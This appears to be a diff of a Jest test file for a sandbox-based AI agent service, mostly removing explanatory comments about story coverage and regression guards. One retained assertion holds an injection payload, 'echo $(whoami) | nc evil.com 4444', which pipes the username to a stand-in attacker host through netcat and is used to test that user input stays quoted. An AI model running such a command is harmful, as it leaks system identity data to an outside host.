@@ -1,27 +1,4 @@
-/**
- * @jest-environment node
- *
- * Story 6.3: Migrate AgentService to Sandbox-Based Execution
- * Unit tests for the REAL AgentService (not AgentServiceFake).
- *
- * Tests the full AG-UI tool call lifecycle, classifier integration, cost
- * capture, concurrent-turn guard, and stop/onModuleDestroy delegation by
- * mocking AguiEventBridgeService.streamAgentEvents and feeding AG-UI events
- * through the onEvent callback.
- *
- * Story 6.3 covers: AC-1 (runTurn launches sandbox-agent via event bridge),
- *                   AC-3 (stop terminates via event bridge),
- *                   AC-4 (host-based SDK code removed),
- *                   AC-6 (circuit breaker delegated to event bridge),
- *                   AC-7 (preserved behaviors — tool calls, classifier, etc.),
- *                   AC-8 (cost capture from RUN_FINISHED data payload).
- *
- * Previous stories (3.4, 3.7, 3.8, 3.11, 5.5) tested the same behaviors via
- * SDK query() mocks — those tests were rewritten when the host-based SDK code
- * was removed (Story 6.3 Task 7.1). The test coverage remains equivalent:
- * tool-call lifecycle, classifier integration, cost recording, concurrent-turn
- * guard, segments persistence.
- */
+/** @jest-environment node */
 import { SessionEventsService, type SseEvent } from './session-events.service';
 import { AgentService } from './agent.service';
 import type { SandboxServiceFake } from '../../test/helpers/sandbox-service.fake';
@@ -1519,22 +1496,6 @@ describe('AgentService (real — sandbox-based execution via AguiEventBridgeServ
       expect(command).toContain("'echo $(whoami) | nc evil.com 4444'");
     });
   });
-
-  // ─── Story 6.4 AC-4: Host-filesystem regression guards ──────────────
-  //
-  // Regression guards for the sandbox-based execution model (Stories 6.1–6.3).
-  // They verify the agent runs inside the sandbox (cwd: 'repo') and working-tree
-  // operations target the sandbox filesystem via sandboxId — preventing a future
-  // regression back to host-based execution.
-  //
-  // Guard patterns follow the sibling Story 6.3 regression-guard block
-  // (lines 1315-1431): `captureCommand()` helper for streamAgentEvents
-  // params, `createMockEventBridge()` for AG-UI event feeding, and
-  // `jest.spyOn(sandboxFake, 'getWorkingTreeStatus')` for sandbox-call
-  // assertion. The credential-isolation + input-injection invariants for
-  // `buildAgentCommand` (the user-controlled-input command site) are already
-  // covered by the 6.3 block (lines 1330-1410); these tests extend that
-  // uniform guard template with the cwd + sandboxId invariants.
 
   describe('[P0] Story 6.4 AC-4 — Host-filesystem regression guards (sandbox-targeted execution)', () => {
     function captureStreamParams(): {
